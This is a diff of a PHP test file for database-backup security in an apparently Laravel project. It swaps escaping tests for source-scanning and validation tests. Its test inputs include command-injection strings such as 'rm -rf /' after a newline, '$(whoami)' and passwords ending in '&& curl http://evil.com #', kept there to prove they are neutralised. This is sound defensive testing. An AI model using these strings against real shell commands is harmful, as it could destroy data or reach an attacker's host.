@@ -1,5 +1,8 @@
 <?php
 
+use App\Jobs\DatabaseBackupJob;
+use App\Support\ValidationPatterns;
+
 /**
  * Database Backup Security Tests
  *
@@ -45,27 +48,6 @@ test('database backup rejects command injection with redirect operators', functi
 test('database backup rejects command injection with newlines', function () {
     expect(fn () => validateShellSafePath("test\nrm -rf /", 'database name'))
         ->toThrow(Exception::class);
-});
-
-test('database backup escapes shell arguments properly', function () {
-    $database = "test'db";
-    $escaped = escapeshellarg($database);
-
-    expect($escaped)->toBe("'test'\\''db'");
-});
-
-test('database backup escapes shell arguments with double quotes', function () {
-    $database = 'test"db';
-    $escaped = escapeshellarg($database);
-
-    expect($escaped)->toBe("'test\"db'");
-});
-
-test('database backup escapes shell arguments with spaces', function () {
-    $database = 'test database';
-    $escaped = escapeshellarg($database);
-
-    expect($escaped)->toBe("'test database'");
 });
 
 test('database backup accepts legitimate database names', function () {
@@ -143,82 +125,41 @@ test('validateDatabasesBackupInput rejects injection in database name within mon
         ->toThrow(Exception::class);
 });
 
-// --- Credential escaping tests for database backup commands ---
+test('backup shell commands do not interpolate raw container names or backup paths', function () {
+    $source = file_get_contents(__DIR__.'/../../app/Jobs/DatabaseBackupJob.php');
+    preg_match_all('/^.*(?:docker exec|mkdir -p |du -b |docker run -d).*$/m', $source, $matches);
 
-test('escapeshellarg neutralizes command injection in postgres password', function () {
-    $maliciousPassword = '"; rm -rf / #';
-    $escaped = escapeshellarg($maliciousPassword);
-
-    // The escaped value must be a single shell token that cannot break out
-    expect($escaped)->not->toContain("\n");
-    expect($escaped)->toBe("'\"; rm -rf / #'");
-    // When used in: -e PGPASSWORD=<escaped>, the shell sees one token
-    $command = 'docker exec -e PGPASSWORD='.$escaped.' container pg_dump';
-    expect($command)->toContain("PGPASSWORD='");
-    expect($command)->not->toContain('PGPASSWORD=""');
+    expect($matches[0])->not->toBeEmpty();
+    foreach ($matches[0] as $command) {
+        $quotedArgumentsRemoved = preg_replace('/escapeshellarg\(\$this->(?:container_name|backup_dir|backup_location)\)/', '', $command);
+        expect($quotedArgumentsRemoved)->not->toMatch('/\$this->(?:container_name|backup_dir|backup_location)\b/');
+    }
 });
 
-test('escapeshellarg neutralizes command injection in postgres username', function () {
-    $maliciousUser = 'admin$(whoami)';
-    $escaped = escapeshellarg($maliciousUser);
+test('backup job accepts supported service container names only', function () {
+    expect(ValidationPatterns::isValidContainerName('db-name_service.1-uuid'))->toBeTrue()
+        ->and(ValidationPatterns::isValidContainerName('db name-uuid'))->toBeFalse()
+        ->and(ValidationPatterns::isValidContainerName("db\nname-uuid"))->toBeFalse()
+        ->and(ValidationPatterns::isValidContainerName("db-uuid\n"))->toBeFalse();
 
-    expect($escaped)->toBe("'admin\$(whoami)'");
-    $command = "docker exec container pg_dump --username $escaped";
-    // The $() should be inside single quotes, preventing execution
-    expect($command)->toContain("--username 'admin\$(whoami)'");
+    $source = file_get_contents(__DIR__.'/../../app/Jobs/DatabaseBackupJob.php');
+    expect($source)->toContain('ValidationPatterns::isValidContainerName($this->container_name)');
 });
 
-test('escapeshellarg neutralizes command injection in mysql password', function () {
-    $maliciousPassword = 'pass" && curl http://evil.com #';
-    $escaped = escapeshellarg($maliciousPassword);
-
-    $command = "docker exec container mysqldump -u root -p$escaped db";
-    // The password must be wrapped in single quotes
-    expect($command)->toContain("-p'pass\" && curl http://evil.com #'");
+test('service restart commands do not interpolate raw container names', function () {
+    foreach (['ServiceDatabase.php', 'ServiceApplication.php'] as $model) {
+        $source = file_get_contents(__DIR__.'/../../app/Models/'.$model);
+        expect($source)->not->toContain('docker restart {$container_id}');
+    }
 });
 
-test('escapeshellarg neutralizes command injection in mariadb password', function () {
-    $maliciousPassword = "pass'; whoami; echo '";
-    $escaped = escapeshellarg($maliciousPassword);
+test('backup filenames remove shell and path separators from database names', function () {
+    $job = (new ReflectionClass(DatabaseBackupJob::class))->newInstanceWithoutConstructor();
+    $filenamePart = (new ReflectionClass($job))->getMethod('backupFilenamePart');
 
-    // Single quotes in the value get escaped as '\''
-    expect($escaped)->toBe("'pass'\\''; whoami; echo '\\'''");
-    $command = "docker exec container mariadb-dump -u root -p$escaped db";
-    // Verify the command doesn't contain an unescaped semicolon outside quotes
-    expect($command)->toContain("-p'pass'");
-});
+    expect($filenamePart->invoke($job, 'safe_db-1'))->toBe('safe_db-1')
+        ->and($filenamePart->invoke($job, '../db name'))->toBe('..-db-name');
 
-test('rawurlencode neutralizes shell injection in mongodb URI credentials', function () {
-    $maliciousUser = 'admin";$(whoami)';
-    $maliciousPass = 'pass@evil.com/admin?authSource=admin&rm -rf /';
-
-    $encodedUser = rawurlencode($maliciousUser);
-    $encodedPass = rawurlencode($maliciousPass);
-    $url = "mongodb://{$encodedUser}:{$encodedPass}@container:27017";
-
-    // Special characters should be percent-encoded
-    expect($encodedUser)->not->toContain('"');
-    expect($encodedUser)->not->toContain('$');
-    expect($encodedUser)->not->toContain('(');
-    expect($encodedPass)->not->toContain('@');
-    expect($encodedPass)->not->toContain('/');
-    expect($encodedPass)->not->toContain('?');
-    expect($encodedPass)->not->toContain('&');
-
-    // The URL should have exactly one @ (the delimiter) and the credentials percent-encoded
-    $atCount = substr_count($url, '@');
-    expect($atCount)->toBe(1);
-});
-
-test('escapeshellarg on mongodb URI prevents shell breakout', function () {
-    // Even if internal_db_url contains malicious content, escapeshellarg wraps it safely
-    $maliciousUrl = 'mongodb://admin:pass@host:27017" && curl http://evil.com #';
-    $escaped = escapeshellarg($maliciousUrl);
-
-    $command = "docker exec container mongodump --uri=$escaped --gzip --archive > /backup";
-    // The entire URI must be inside single quotes
-    expect($command)->toContain("--uri='mongodb://admin:pass@host:27017");
-    expect($command)->toContain("evil.com #'");
-    // No unescaped double quotes that could break the command
-    expect(substr_count($command, "'"))->toBeGreaterThanOrEqual(2);
+    $source = file_get_contents(__DIR__.'/../../app/Jobs/DatabaseBackupJob.php');
+    expect(substr_count($source, '$this->backupFilenamePart('))->toBe(4);
 });
